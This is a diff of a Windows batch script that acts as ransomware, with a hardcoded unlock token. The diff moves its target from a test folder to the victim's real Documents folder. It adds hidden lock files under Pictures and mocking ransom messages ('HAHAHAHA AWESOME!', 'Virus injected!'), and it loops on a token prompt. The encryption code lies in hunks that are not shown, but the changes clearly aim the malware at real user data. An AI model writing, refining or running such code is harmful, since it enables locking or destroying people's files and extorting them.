@@ -2,16 +2,24 @@
 title System
 color 0C
 
-set "a=%userprofile%\OneDrive\Dokumen\target"
-set "b=%userprofile%\Videos\Backup_Encrypted"
-set "c=%userprofile%\Videos\Backup_Encrypted\enc.lock"
-set "d=qwertyuiopoi"
+REM Initialize target folder based on OneDrive existence
+if exist "%userprofile%\OneDrive\Documents" (
+    set "a=%userprofile%\OneDrive\Documents"
+    set "b=%userprofile%\OneDrive\Pictures\Backup_Encrypted"
+) else (
+    set "a=%userprofile%\Documents"  
+    set "b=%userprofile%\Pictures\Backup_Encrypted" 
+)
+
+set "c=%b%\enc.lock"  
+set "d=$$#@#$@#</>encry</>pts$all#@files$#@#$#**" 
 setlocal enabledelayedexpansion
 
 REM Obfuscated script begins
 if exist "%b%" (
     echo ########################################
-    echo Files in "%a%" encrypted!
+    echo All files in "%a%" has been corrupted and encrypted!
+    echo HAHAHAHA AWESOME !
     echo Virus injected!
     echo ########################################
     echo.
@@ -62,10 +70,11 @@ REM Encryption process starts
 attrib +h +s "%c%"
 cls
 echo ########################################
-echo Files in "%a%" encrypted!
-echo Virus injected!
-echo ########################################
-echo.
+    echo All files in "%a%" has been corrupted and encrypted!
+    echo HAHAHAHA AWESOME !
+    echo Virus injected!
+    echo ########################################
+    echo.
 :e
 set /p "j=Enter Token: "
 
@@ -87,7 +96,7 @@ if "%j%"=="%d%" (
     echo [SUCCESS]
     pause
 ) else (
-    echo Invalid Token!
+    echo Invalid Token! HAHAHAHAHA
     goto :e
 )
 
